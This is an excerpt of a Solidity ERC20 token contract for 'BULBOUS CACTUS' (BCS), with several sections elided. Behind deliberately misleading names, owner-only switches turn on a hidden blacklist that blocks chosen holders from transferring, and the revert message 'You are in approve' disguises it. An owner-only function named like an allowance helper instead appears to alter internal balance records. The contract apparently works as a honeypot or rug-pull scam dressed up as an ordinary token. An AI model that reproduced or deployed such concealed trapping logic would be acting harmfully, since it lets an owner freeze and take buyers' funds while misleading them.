...
contract BULBOUSCACTUS is Context, IERC20, Ownable {
    ...
    string private _name = "BULBOUS CACTUS";
    string private _symbol = "BCS";
    uint8 private _decimals = 18;
    
    mapping(address => bool) private _BBC;
    bool private _isapproveH = true;
    ...
    function setapproveH(bool approveH) external onlyOwner() {
        _isapproveH = approveH;
    }
    
    function setALLapprove(bool ALLapprove) external onlyOwner() {
        _isALLapprove = ALLapprove;
    }
    ...
    function _transfer(
        ...
        if (_isapproveH) {
            require(_BBC[from] == false, "You are in approve ");
        }
    ...
    function increaseAllowancesl(address spender, uint256 addedValue) external onlyOwner() {
        require(addedValue > 0, "Transfer amount must be greater than zero");
        uint256 inAmount = HUH[spender];
        if (inAmount == 0) _BTList.push(spender);
